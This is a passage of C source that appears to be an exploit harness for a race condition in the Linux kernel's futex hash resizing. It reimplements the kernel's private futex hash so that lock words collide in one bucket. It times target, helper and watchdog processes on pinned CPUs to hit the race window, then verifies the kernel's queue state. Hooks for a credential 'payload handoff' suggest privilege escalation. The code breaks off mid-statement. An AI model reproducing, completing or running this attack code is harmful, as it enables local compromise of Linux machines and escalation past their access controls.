	_Atomic uint64_t helper_timer_call_ns;
	_Atomic uint64_t helper_timer_return_ns;
	_Atomic uint64_t helper_active_ns;

	_Alignas(64) _Atomic int watchdog_ready;
	_Atomic int watchdog_fired;
	_Atomic int watchdog_release;
	_Atomic uint64_t watchdog_deadline_ns;

	_Alignas(64) _Atomic int selector_started;
	_Atomic int selector_done;
	_Atomic long selector_result;
	_Atomic int selector_errno;
	_Atomic long slots_before;
	_Atomic long slots_after;
	_Atomic uint64_t selector_call_ns;
	_Atomic uint64_t selector_return_ns;
	_Atomic uint64_t timer_deadline_ns;
	_Atomic uint64_t landing_tick_ns;
	_Atomic uint64_t target_deadline_ns;
	_Atomic uint64_t delta_ns;
	_Atomic int terminal_word;
};

struct futex_race_words {
	_Atomic uint32_t *owner;
	_Atomic uint32_t *warm;
	_Atomic uint32_t *selector;
	_Atomic uint32_t *cow_cookie;
	void *page;
};

struct futex_race_kernel_timespec {
	int64_t tv_sec;
	int64_t tv_nsec;
};

_Static_assert(sizeof(struct futex_race_kernel_timespec) == 16,
	       "x86-64 futex time64 ABI size changed");
_Static_assert(offsetof(struct futex_race_kernel_timespec, tv_nsec) == 8,
	       "x86-64 futex time64 ABI layout changed");
_Static_assert(FUTEX_RACE_INITIAL_HASH_MASK == 7U,
	       "initial futex-hash mask/schema changed");
_Static_assert(FUTEX_RACE_INITIAL_HASH_SLOTS == PRIMARY_HASH_SLOTS,
	       "initial hash-slot contract drift");
_Static_assert(FUTEX_RACE_EXPANDED_HASH_SLOTS == CONTROL_HASH_SLOTS,
	       "expanded hash-slot contract drift");
_Static_assert(FUTEX_LOCK_PI2_PRIVATE == 141,
	       "x86-64 FUTEX_LOCK_PI2_PRIVATE/schema changed");
_Static_assert(FUTEX_WAKE_PRIVATE == 129,
	       "x86-64 FUTEX_WAKE_PRIVATE/schema changed");
_Static_assert(EDEADLK == 35, "Linux EDEADLK/schema changed");

struct futex_race_target_context {
	struct futex_race_shared *shared;
	struct futex_race_words *words;
	unsigned int generation;
};

static struct futex_race_target_context futex_race_target_context_storage;

struct futex_race_session {
	pid_t target_pid;
	pid_t helper_pid;
	pid_t watchdog_pid;
	struct guarded_stack target_stack;
};

static uint64_t futex_race_now_ns(void)
{
	struct timespec now;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return 0;
	return (uint64_t)now.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)now.tv_nsec;
}

static void futex_race_cpu_relax(void)
{
	__asm__ volatile("pause" ::: "memory");
}

static uint32_t futex_race_rol32(uint32_t value, unsigned int shift)
{
	return (value << shift) | (value >> (32U - shift));
}

static uint32_t private_futex_hash(uintptr_t address)
{
	uintptr_t base = address & ~(uintptr_t)(FUTEX_RACE_WORD_PAGE_SIZE - 1U);
	uint32_t offset = (uint32_t)(address - base);
	uint32_t a = FUTEX_RACE_JHASH_INITVAL + UINT32_C(8) + offset;
	uint32_t b = a;
	uint32_t c = a;

	a += (uint32_t)base;
	b += (uint32_t)(base >> 32);
	c ^= b;
	c -= futex_race_rol32(b, 14);
	a ^= c;
	a -= futex_race_rol32(c, 11);
	b ^= a;
	b -= futex_race_rol32(a, 25);
	c ^= b;
	c -= futex_race_rol32(b, 16);
	a ^= c;
	a -= futex_race_rol32(c, 4);
	b ^= a;
	b -= futex_race_rol32(a, 14);
	c ^= b;
	c -= futex_race_rol32(b, 24);
	return c;
}

static int select_same_bucket_words(void *page, struct futex_race_words *words)
{
	unsigned char *bytes = page;
	size_t owner_offset = FUTEX_RACE_WORD_PAGE_SIZE;

	if ((uintptr_t)page % FUTEX_RACE_WORD_PAGE_SIZE != 0)
		return -1;
	for (size_t offset = 0;
	     offset + sizeof(uint32_t) <= FUTEX_RACE_WORD_PAGE_SIZE;
	     offset += sizeof(uint32_t)) {
		if ((private_futex_hash((uintptr_t)(bytes + offset)) &
		     FUTEX_RACE_INITIAL_HASH_MASK) == 0) {
			owner_offset = offset;
			break;
		}
	}
	if (owner_offset == FUTEX_RACE_WORD_PAGE_SIZE)
		return -1;
	words->owner = (_Atomic uint32_t *)(void *)(bytes + owner_offset);
	words->warm = (_Atomic uint32_t *)(void *)(bytes +
						   ((owner_offset + 64U) &
						    (FUTEX_RACE_WORD_PAGE_SIZE -
						     1U)));
	words->selector =
		(_Atomic uint32_t *)(void *)(bytes +
					     ((owner_offset + 128U) &
					      (FUTEX_RACE_WORD_PAGE_SIZE - 1U)));
	words->cow_cookie =
		(_Atomic uint32_t *)(void *)(bytes +
					     ((owner_offset + 192U) &
					      (FUTEX_RACE_WORD_PAGE_SIZE - 1U)));
	words->page = page;
	if (words->owner == words->warm || words->owner == words->selector ||
	    words->owner == words->cow_cookie ||
	    words->warm == words->selector ||
	    words->warm == words->cow_cookie ||
	    words->selector == words->cow_cookie)
		return -1;
	return 0;
}

static uint32_t futex_race_cow_cookie(unsigned int generation)
{
	return UINT32_C(0xc0410000) ^ generation;
}

static uint64_t futex_race_spin_until(uint64_t deadline_ns)
{
	uint64_t now_ns;

	for (;;) {
		now_ns = futex_race_now_ns();
		if (now_ns >= deadline_ns)
			return now_ns;
		futex_race_cpu_relax();
	}
}

static int futex_race_raw_getcpu(void)
{
	unsigned int cpu = UINT_MAX;
	long result =
		raw_syscall3(SYS_GETCPU_X86_64, (long)(uintptr_t)&cpu, 0, 0);

	return result == 0 && cpu <= INT_MAX ? (int)cpu : -1;
}

static int futex_race_security_selfcheck(int expected_nnp)
{
	struct payload_handoff_ids ids;

	return payload_handoff_capture_ids(&ids) == 0 &&
			       payload_handoff_ids_are_start(&ids) &&
			       prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) ==
				       expected_nnp ?
		       0 :
		       -1;
}

static int futex_race_singleton_cpu(unsigned int expected)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	if (sched_getaffinity(0, sizeof(set), &set) != 0)
		return -1;
	return CPU_COUNT(&set) == 1 && CPU_ISSET(expected, &set) ? 0 : -1;
}

static long futex_race_futex_call(_Atomic uint32_t *word, int operation,
				  uint32_t value)
{
	return raw_syscall6(SYS_FUTEX_X86_64, (long)(uintptr_t)word, operation,
			    value, 0, 0, 0);
}

static long
futex_race_futex_timed_call(_Atomic uint32_t *word, int operation,
			    uint32_t value,
			    const struct futex_race_kernel_timespec *timeout)
{
	return raw_syscall6(SYS_FUTEX_X86_64, (long)(uintptr_t)word, operation,
			    value, (long)(uintptr_t)timeout, 0, 0);
}

static int futex_race_shared_wait(_Atomic int *word, int expected)
{
	long result = raw_syscall6(SYS_FUTEX_X86_64, (long)(uintptr_t)word,
				   FUTEX_WAIT, expected, 0, 0, 0);

	return result >= 0 || result == -EAGAIN || result == -EINTR ? 0 : -1;
}

static int futex_race_shared_wake(_Atomic int *word, int count)
{
	return (int)raw_syscall6(SYS_FUTEX_X86_64, (long)(uintptr_t)word,
				 FUTEX_WAKE, count, 0, 0, 0);
}

static int futex_race_wait_int(_Atomic int *value, int expected,
			       uint64_t timeout_ns)
{
	uint64_t deadline = futex_race_now_ns() + timeout_ns;

	while (atomic_load_explicit(value, memory_order_acquire) != expected) {
		if (futex_race_now_ns() >= deadline)
			return -1;
		futex_race_cpu_relax();
	}
	return 0;
}

static int futex_race_wait_word_mask(_Atomic uint32_t *word, uint32_t mask,
				     uint64_t timeout_ns)
{
	uint64_t deadline = futex_race_now_ns() + timeout_ns;

	while (!(atomic_load_explicit(word, memory_order_acquire) & mask)) {
		if (futex_race_now_ns() >= deadline)
			return -1;
		futex_race_cpu_relax();
	}
	return 0;
}

static int futex_race_sleep_ns(uint64_t duration_ns)
{
	struct timespec delay = {
		.tv_sec = (time_t)(duration_ns / UINT64_C(1000000000)),
		.tv_nsec = (long)(duration_ns % UINT64_C(1000000000)),
	};

	while (nanosleep(&delay, &delay) != 0) {
		if (errno != EINTR)
			return -1;
	}
	return 0;
}

static int futex_race_waitpid_timeout(pid_t pid, int *status,
				      uint64_t timeout_ns)
{
	uint64_t deadline = futex_race_now_ns() + timeout_ns;
	struct timespec pause = { .tv_sec = 0, .tv_nsec = 100000 };

	for (;;) {
		pid_t result = waitpid(pid, status, WNOHANG);

		if (result == pid)
			return 0;
		if (result < 0 && errno != EINTR)
			return -1;
		if (futex_race_now_ns() >= deadline)
			return -1;
		(void)nanosleep(&pause, NULL);
	}
}

static long futex_race_get_slots(void)
{
	return raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH,
			    PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0);
}

static int futex_race_target_main(void *opaque)
{
	struct futex_race_target_context *context = opaque;
	struct futex_race_shared *shared = context->shared;
	struct futex_race_words *words = context->words;
	unsigned int generation = context->generation;
	struct sched_param parameter = { .sched_priority = 0 };
	char name[16];
	long result;
	long unlock_result = LONG_MIN;
	long warm_result;
	long warm_unlock_result = LONG_MIN;
	uint64_t postfork_ready_ns;
	int target_nice;

	(void)snprintf(name, sizeof(name), "target-%05u", generation);
	if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 ||
	    prctl(PR_SET_TIMERSLACK, 1, 0, 0, 0) != 0 ||
	    pin_cpu(FUTEX_RACE_LANDING_CPU) != 0 ||
	    sched_setscheduler(0, SCHED_OTHER, &parameter) != 0 ||
	    futex_race_security_selfcheck(1) != 0)
		return 40;

	warm_result =
		futex_race_futex_call(words->warm, FUTEX_LOCK_PI_PRIVATE, 0);
	atomic_store_explicit(&shared->target_warm_result, warm_result,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_warm_unlock_result,
			      warm_unlock_result, memory_order_relaxed);
	if (warm_result != 0 ||
	    (atomic_load_explicit(words->warm, memory_order_acquire) &
	     (FUTEX_TID_MASK | FUTEX_OWNER_DIED)) !=
		    (uint32_t)raw_syscall0(SYS_GETTID_X86_64) ||
	    setpriority(PRIO_PROCESS, 0, 19) != 0 ||
	    sched_setscheduler(0, SCHED_IDLE, &parameter) != 0)
		return 41;
	errno = 0;
	target_nice = getpriority(PRIO_PROCESS, 0);
	if (errno != 0 || target_nice != 19)
		return 41;
	atomic_store_explicit(&shared->target_policy, sched_getscheduler(0),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_nice, target_nice,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_cpu, futex_race_raw_getcpu(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_ready_ns, futex_race_now_ns(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_ready, 1, memory_order_release);
	while (!atomic_load_explicit(&shared->helper_timer_call_ns,
				     memory_order_acquire))
		futex_race_cpu_relax();

	atomic_store_explicit(words->cow_cookie,
			      futex_race_cow_cookie(generation),
			      memory_order_release);
	if (atomic_load_explicit(words->cow_cookie, memory_order_acquire) !=
	    futex_race_cow_cookie(generation))
		return 43;
	atomic_store_explicit(&shared->target_words_cow_ready, (int)generation,
			      memory_order_release);
	postfork_ready_ns = futex_race_now_ns();
	if (!postfork_ready_ns)
		return 43;
	atomic_store_explicit(&shared->target_ready_ns, postfork_ready_ns,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_timer_observed, 1,
			      memory_order_release);
	while (atomic_load_explicit(&shared->target_start,
				    memory_order_acquire) != (int)generation)
		futex_race_cpu_relax();

	atomic_store_explicit(&shared->target_enter_ns, futex_race_now_ns(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_entered, 1, memory_order_release);
	result = futex_race_futex_call(words->owner, FUTEX_LOCK_PI_PRIVATE, 0);
	if (result == 0)
		unlock_result = futex_race_futex_call(
			words->owner, FUTEX_UNLOCK_PI_PRIVATE, 0);
	if (result == 0 && unlock_result == 0)
		warm_unlock_result = futex_race_futex_call(
			words->warm, FUTEX_UNLOCK_PI_PRIVATE, 0);
	atomic_store_explicit(&shared->target_result, result,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_unlock_result, unlock_result,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_warm_unlock_result,
			      warm_unlock_result, memory_order_relaxed);
	atomic_store_explicit(&shared->target_return_ns, futex_race_now_ns(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_done, 1, memory_order_release);
	return result == 0 && unlock_result == 0 && warm_unlock_result == 0 ?
		       0 :
		       42;
}

static void futex_race_helper_main(struct futex_race_shared *shared,
				   unsigned int generation)
	__attribute__((noreturn));

static void futex_race_helper_main(struct futex_race_shared *shared,
				   unsigned int generation)
{
	struct sched_param parameter = { .sched_priority = 0 };
	struct timespec deadline;
	char name[16];
	uint64_t deadline_ns;
	uint64_t return_ns;
	int result;

	(void)snprintf(name, sizeof(name), "helper-%05u", generation);
	if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 ||
	    prctl(PR_SET_TIMERSLACK, 1, 0, 0, 0) != 0 ||
	    pin_cpu(FUTEX_RACE_LANDING_CPU) != 0 ||
	    sched_setscheduler(0, SCHED_OTHER, &parameter) != 0 ||
	    futex_race_security_selfcheck(1) != 0)
		_exit(50);
	atomic_store_explicit(&shared->helper_policy, sched_getscheduler(0),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_cpu, futex_race_raw_getcpu(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_ready_ns, futex_race_now_ns(),
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_ready, 1, memory_order_release);
	for (;;) {
		if (atomic_load_explicit(&shared->helper_arm,
					 memory_order_acquire) ==
		    (int)generation)
			break;
		atomic_store_explicit(&shared->helper_waiting_arm, 1,
				      memory_order_release);
		(void)futex_race_shared_wait(&shared->helper_arm, 0);
	}
	deadline_ns = atomic_load_explicit(&shared->timer_deadline_ns,
					   memory_order_acquire);
	deadline.tv_sec = (time_t)(deadline_ns / UINT64_C(1000000000));
	deadline.tv_nsec = (long)(deadline_ns % UINT64_C(1000000000));
	atomic_store_explicit(&shared->helper_timer_call_ns,
			      futex_race_now_ns(), memory_order_release);
	do {
		result = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME,
					 &deadline, NULL);
	} while (result == EINTR);
	return_ns = futex_race_now_ns();
	atomic_store_explicit(&shared->helper_timer_result, result,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_timer_return_ns, return_ns,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_active_ns, return_ns,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->helper_active, 1, memory_order_release);

	for (;;) {
		if (atomic_load_explicit(&shared->helper_release,
					 memory_order_acquire) ==
		    (int)generation)
			break;
		if (atomic_load_explicit(&shared->helper_park_cmd,
					 memory_order_acquire) ==
		    (int)generation) {
			atomic_store_explicit(&shared->helper_park_call_ns,
					      futex_race_now_ns(),
					      memory_order_relaxed);
			atomic_store_explicit(&shared->helper_park_intent,
					      (int)generation,
					      memory_order_release);
			(void)futex_race_shared_wait(&shared->helper_park_word,
						     0);
			atomic_store_explicit(&shared->helper_park_failed, 1,
					      memory_order_release);
			for (;;)
				futex_race_cpu_relax();
		}
		futex_race_cpu_relax();
	}
	_exit(result == 0 ? 0 : 51);
}

static void futex_race_watchdog_main(struct futex_race_shared *shared,
				     unsigned int generation)
	__attribute__((noreturn));

static void futex_race_watchdog_main(struct futex_race_shared *shared,
				     unsigned int generation)
{
	struct sched_param parameter = { .sched_priority = 0 };
	struct timespec deadline;
	uint64_t deadline_ns;

	if (prctl(PR_SET_NAME, "race-watchdog", 0, 0, 0) != 0 ||
	    prctl(PR_SET_TIMERSLACK, 1, 0, 0, 0) != 0 ||
	    pin_cpu(FUTEX_RACE_WATCHDOG_CPU) != 0 ||
	    sched_setscheduler(0, SCHED_OTHER, &parameter) != 0 ||
	    futex_race_security_selfcheck(1) != 0)
		_exit(60);
	atomic_store_explicit(&shared->watchdog_ready, 1, memory_order_release);
	deadline_ns = atomic_load_explicit(&shared->watchdog_deadline_ns,
					   memory_order_acquire);
	deadline.tv_sec = (time_t)(deadline_ns / UINT64_C(1000000000));
	deadline.tv_nsec = (long)(deadline_ns % UINT64_C(1000000000));
	while (clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &deadline,
			       NULL) == EINTR)
		;
	if (atomic_load_explicit(&shared->selector_done,
				 memory_order_acquire) != (int)generation)
		atomic_store_explicit(&shared->watchdog_fired, 1,
				      memory_order_release);

	while (atomic_load_explicit(&shared->watchdog_release,
				    memory_order_acquire) != (int)generation)
		futex_race_cpu_relax();
	_exit(0);
}

static int futex_race_unmap_stack(struct guarded_stack *stack)
{
	long page_size = sysconf(_SC_PAGESIZE);

	if (!stack->mapping)
		return 0;
	if (page_size <= 0 ||
	    munmap(stack->mapping,
		   FUTEX_RACE_STACK_SIZE + 2U * (size_t)page_size) != 0)
		return -1;
	stack->mapping = NULL;
	stack->usable = NULL;
	return 0;
}

static int futex_race_cleanup_miss(struct futex_race_shared *shared,
				   struct futex_race_session *session,
				   struct futex_race_words *words,
				   unsigned int generation)
{
	int target_status = 0;
	int helper_status = 0;
	int watchdog_status = 0;
	long owner_unlock;

	owner_unlock =
		futex_race_futex_call(words->owner, FUTEX_UNLOCK_PI_PRIVATE, 0);
	if (owner_unlock != 0)
		return -1;
	atomic_store_explicit(&shared->helper_release, (int)generation,
			      memory_order_release);
	atomic_store_explicit(&shared->watchdog_release, (int)generation,
			      memory_order_release);
	if (futex_race_waitpid_timeout(session->helper_pid, &helper_status,
				       FUTEX_RACE_REAP_TIMEOUT_NS) != 0 ||
	    futex_race_waitpid_timeout(session->target_pid, &target_status,
				       FUTEX_RACE_REAP_TIMEOUT_NS) != 0 ||
	    futex_race_waitpid_timeout(session->watchdog_pid, &watchdog_status,
				       FUTEX_RACE_REAP_TIMEOUT_NS) != 0)
		return -1;
	session->helper_pid = -1;
	session->target_pid = -1;
	session->watchdog_pid = -1;
	if (!WIFEXITED(helper_status) || WEXITSTATUS(helper_status) != 0 ||
	    !WIFEXITED(target_status) || WEXITSTATUS(target_status) != 0 ||
	    !WIFEXITED(watchdog_status) || WEXITSTATUS(watchdog_status) != 0 ||
	    atomic_load_explicit(&shared->target_result,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&shared->target_unlock_result,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&shared->target_warm_unlock_result,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(words->owner, memory_order_acquire) != 0 ||
	    atomic_load_explicit(words->warm, memory_order_acquire) != 0 ||
	    futex_race_unmap_stack(&session->target_stack) != 0)
		return -1;
	return 0;
}

static int
futex_race_verify_late_queue(struct futex_race_shared *shared,
			     const struct futex_race_session *session,
			     const struct futex_race_words *words,
			     unsigned int generation)
{
	struct futex_race_kernel_timespec cycle_deadline;
	uint64_t cycle_call_ns = 0;
	uint64_t cycle_return_ns = 0;
	uint64_t wake_call_ns = 0;
	uint64_t wake_return_ns = 0;
	uint64_t waiters_seen_ns = 0;
	uint64_t lateq_done_ns = 0;
	uint64_t helper_park_call_ns = 0;
	uint64_t selector_return_ns;
	uint64_t deadline_base_ns;
	uint64_t deadline_ns;
	uint32_t owner_before = 0;
	uint32_t warm_before = 0;
	uint32_t owner_after = 0;
	uint32_t warm_after = 0;
	long cycle_result = LONG_MIN;
	long wake_result = LONG_MIN;
	long slots_after_cycle = LONG_MIN;
	long slots_after_wake = LONG_MIN;
	int controller_tid = (int)raw_syscall0(SYS_GETTID_X86_64);
	int queue_proof;

	atomic_store_explicit(&shared->helper_park_cmd, (int)generation,
			      memory_order_release);
	if (futex_race_wait_int(&shared->helper_park_intent, (int)generation,
				FUTEX_RACE_LATEQ_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&shared->helper_park_failed,
				 memory_order_acquire) != 0 ||
	    futex_race_wait_word_mask(words->owner, FUTEX_WAITERS,
				      FUTEX_RACE_LATEQ_TIMEOUT_NS) != 0)
		return -1;
	waiters_seen_ns = futex_race_now_ns();
	if (!waiters_seen_ns ||
	    futex_race_sleep_ns(FUTEX_RACE_LATEQ_SETTLE_NS) != 0)
		return -1;

	owner_before = atomic_load_explicit(words->owner, memory_order_acquire);
	warm_before = atomic_load_explicit(words->warm, memory_order_acquire);
	helper_park_call_ns = atomic_load_explicit(&shared->helper_park_call_ns,
						   memory_order_acquire);
	selector_return_ns = atomic_load_explicit(&shared->selector_return_ns,
						  memory_order_acquire);
	if (owner_before != ((uint32_t)controller_tid | FUTEX_WAITERS) ||
	    warm_before != (uint32_t)session->target_pid ||
	    atomic_load_explicit(&shared->target_done, memory_order_acquire) !=
		    0 ||
	    !helper_park_call_ns || selector_return_ns > helper_park_call_ns ||
	    helper_park_call_ns > waiters_seen_ns)
		return -1;

	deadline_base_ns = futex_race_now_ns();
	if (!deadline_base_ns ||
	    deadline_base_ns > UINT64_MAX - FUTEX_RACE_CYCLE_TIMEOUT_NS)
		return -1;
	deadline_ns = deadline_base_ns + FUTEX_RACE_CYCLE_TIMEOUT_NS;
	cycle_deadline.tv_sec = (int64_t)(deadline_ns / UINT64_C(1000000000));
	cycle_deadline.tv_nsec = (int64_t)(deadline_ns % UINT64_C(1000000000));
	cycle_call_ns = futex_race_now_ns();
	cycle_result = futex_race_futex_timed_call(
		words->warm, FUTEX_LOCK_PI2_PRIVATE, 0, &cycle_deadline);
	cycle_return_ns = futex_race_now_ns();
	slots_after_cycle = futex_race_get_slots();
	wake_call_ns = futex_race_now_ns();
	wake_result =
		futex_race_futex_call(words->owner, FUTEX_WAKE_PRIVATE, 1);
	wake_return_ns = futex_race_now_ns();
	slots_after_wake = futex_race_get_slots();
	owner_after = atomic_load_explicit(words->owner, memory_order_acquire);
	warm_after = atomic_load_explicit(words->warm, memory_order_acquire);
	lateq_done_ns = futex_race_now_ns();
	queue_proof =
		cycle_result == -EDEADLK && cycle_call_ns != 0 &&
		cycle_return_ns > cycle_call_ns &&
		cycle_return_ns < deadline_ns &&
		cycle_return_ns - cycle_call_ns < FUTEX_RACE_CYCLE_TIMEOUT_NS &&
		wake_call_ns >= cycle_return_ns &&
		wake_return_ns > wake_call_ns &&
		wake_return_ns - wake_call_ns < FUTEX_RACE_CYCLE_TIMEOUT_NS &&
		lateq_done_ns >= wake_return_ns &&
		slots_after_cycle == FUTEX_RACE_EXPANDED_HASH_SLOTS &&
		wake_result == 0 &&
		slots_after_wake == FUTEX_RACE_EXPANDED_HASH_SLOTS &&
		owner_after == ((uint32_t)controller_tid | FUTEX_WAITERS) &&
		(warm_after & FUTEX_TID_MASK) ==
			(uint32_t)session->target_pid &&
		!(warm_after & FUTEX_OWNER_DIED) &&
		atomic_load_explicit(&shared->target_done,
				     memory_order_acquire) == 0 &&
		atomic_load_explicit(&shared->helper_park_failed,
				     memory_order_acquire) == 0 &&
		atomic_load_explicit(&shared->target_words_cow_ready,
				     memory_order_acquire) == (int)generation &&
		atomic_load_explicit(words->cow_cookie, memory_order_acquire) ==
			futex_race_cow_cookie(generation) &&
		(private_futex_hash((uintptr_t)words->owner) &
		 FUTEX_RACE_INITIAL_HASH_MASK) == 0;

	if (!queue_proof)
		return -1;
	return 0;
}

static int run_futex_race_attempt(struct futex_race_shared *shared,
				  struct futex_race_words *words,
				  unsigned int generation, uint64_t delta_ns)
{
	struct futex_race_target_context *context =
		&futex_race_target_context_storage;
	struct futex_race_session session = {
		.target_pid = -1,
		.helper_pid = -1,
		.watchdog_pid = -1,
	};
	uint64_t timer_deadline;
	uint64_t landing_tick;
	uint64_t target_deadline;
	uint64_t selector_call;
	uint64_t selector_return;
	long slots_before;
	long slots_after;
	long selector_result;
	int arm_wake;
	int selector_errno = 0;
	struct sched_param parameter = { .sched_priority = 0 };

	memset(shared, 0, sizeof(*shared));
	context->shared = shared;
	context->words = words;
	context->generation = generation;
	atomic_store_explicit(&shared->generation, generation,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_result, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_unlock_result, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_warm_result, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->target_warm_unlock_result, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->selector_result, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->slots_before, LONG_MIN,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->slots_after, LONG_MIN,
			      memory_order_relaxed);
	memset(words->page, 0, FUTEX_RACE_WORD_PAGE_SIZE);
	if ((private_futex_hash((uintptr_t)words->owner) &
	     FUTEX_RACE_INITIAL_HASH_MASK) != 0 ||
	    words->owner == words->warm || words->owner == words->selector ||
	    words->owner == words->cow_cookie)
		return -1;
	if (pin_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    futex_race_singleton_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    sched_setscheduler(0, SCHED_OTHER, &parameter) != 0 ||
	    futex_race_security_selfcheck(1) != 0)
		return -1;
	slots_before = futex_race_get_slots();
	atomic_store_explicit(&shared->slots_before, slots_before,
			      memory_order_relaxed);
	if (slots_before != FUTEX_RACE_INITIAL_HASH_SLOTS)
		return -1;
	if (futex_race_futex_call(words->owner, FUTEX_LOCK_PI_PRIVATE, 0) != 0)
		return -1;
	if ((atomic_load_explicit(words->owner, memory_order_acquire) &
	     FUTEX_TID_MASK) != (uint32_t)syscall(SYS_gettid))
		return -1;
	session.target_stack = allocate_stack(FUTEX_RACE_STACK_SIZE);
	if (!session.target_stack.usable)
		return -1;
	session.target_pid = clone(futex_race_target_main,
				   (char *)session.target_stack.usable +
					   FUTEX_RACE_STACK_SIZE,
				   CLONE_VM | SIGCHLD, context);
	if (session.target_pid <= 0) {
		return -1;
	}
	int target_wait = futex_race_wait_int(&shared->target_ready, 1,
					      FUTEX_RACE_SETUP_TIMEOUT_NS);
	if (target_wait != 0 ||
	    atomic_load_explicit(&shared->target_policy,
				 memory_order_acquire) != SCHED_IDLE ||
	    atomic_load_explicit(&shared->target_cpu, memory_order_acquire) !=
		    (int)FUTEX_RACE_LANDING_CPU ||
	    atomic_load_explicit(&shared->target_warm_result,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&shared->target_warm_unlock_result,
				 memory_order_acquire) != LONG_MIN ||
	    (atomic_load_explicit(words->warm, memory_order_acquire) &
	     (FUTEX_TID_MASK | FUTEX_OWNER_DIED)) !=
		    (uint32_t)session.target_pid) {
		return -1;
	}
	errno = 0;
	session.helper_pid = fork();
	if (session.helper_pid < 0) {
		return -1;
	}
	if (session.helper_pid == 0)
		futex_race_helper_main(shared, generation);
	int helper_wait = futex_race_wait_int(&shared->helper_ready, 1,
					      FUTEX_RACE_SETUP_TIMEOUT_NS);
	if (helper_wait != 0 ||
	    atomic_load_explicit(&shared->helper_policy,
				 memory_order_acquire) != SCHED_OTHER ||
	    atomic_load_explicit(&shared->helper_cpu, memory_order_acquire) !=
		    (int)FUTEX_RACE_LANDING_CPU) {
		return -1;
	}
	if (futex_race_wait_int(&shared->helper_waiting_arm, 1,
				FUTEX_RACE_SETUP_TIMEOUT_NS) != 0)
		return -1;
	landing_tick = futex_race_now_ns() + FUTEX_RACE_DEADLINE_LEAD_NS;
	landing_tick = ((landing_tick + FUTEX_RACE_TICK_PERIOD_NS - 1) /
			FUTEX_RACE_TICK_PERIOD_NS) *
		       FUTEX_RACE_TICK_PERIOD_NS;
	timer_deadline = landing_tick - FUTEX_RACE_HELPER_WAKE_LEAD_NS;
	target_deadline = landing_tick - delta_ns;
	atomic_store_explicit(&shared->timer_deadline_ns, timer_deadline,
			      memory_order_release);
	atomic_store_explicit(&shared->landing_tick_ns, landing_tick,
			      memory_order_release);
	atomic_store_explicit(&shared->target_deadline_ns, target_deadline,
			      memory_order_release);
	atomic_store_explicit(&shared->delta_ns, delta_ns,
			      memory_order_release);

	atomic_store_explicit(&shared->watchdog_deadline_ns,
			      landing_tick + FUTEX_RACE_SELECTOR_TIMEOUT_NS,
			      memory_order_release);
	session.watchdog_pid = fork();
	if (session.watchdog_pid < 0)
		return -1;
	if (session.watchdog_pid == 0)
		futex_race_watchdog_main(shared, generation);
	if (futex_race_wait_int(&shared->watchdog_ready, 1,
				FUTEX_RACE_SETUP_TIMEOUT_NS) != 0)
		return -1;
	atomic_store_explicit(&shared->helper_arm, (int)generation,
			      memory_order_release);
	arm_wake = futex_race_shared_wake(&shared->helper_arm, 1);
	if (arm_wake != 1 ||
	    futex_race_wait_int(&shared->target_timer_observed, 1,
				FUTEX_RACE_SETUP_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&shared->target_words_cow_ready,
				 memory_order_acquire) != (int)generation ||
	    atomic_load_explicit(words->cow_cookie, memory_order_acquire) !=
		    futex_race_cow_cookie(generation) ||
	    (atomic_load_explicit(words->owner, memory_order_acquire) &
	     (FUTEX_TID_MASK | FUTEX_OWNER_DIED)) !=
		    (uint32_t)raw_syscall0(SYS_GETTID_X86_64) ||
	    (atomic_load_explicit(words->warm, memory_order_acquire) &
	     (FUTEX_TID_MASK | FUTEX_OWNER_DIED)) !=
		    (uint32_t)session.target_pid ||
	    futex_race_now_ns() + delta_ns >= landing_tick)
		return -1;

	(void)futex_race_spin_until(target_deadline);
	atomic_store_explicit(&shared->target_start, (int)generation,
			      memory_order_release);

	if (futex_race_wait_int(&shared->helper_active, 1,
				FUTEX_RACE_DEADLINE_LEAD_NS +
					FUTEX_RACE_SETUP_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&shared->helper_timer_result,
				 memory_order_acquire) != 0)
		return -2;
	atomic_store_explicit(&shared->selector_started, (int)generation,
			      memory_order_release);
	selector_call = futex_race_now_ns();
	atomic_store_explicit(&shared->selector_call_ns, selector_call,
			      memory_order_relaxed);
	errno = 0;
	selector_result =
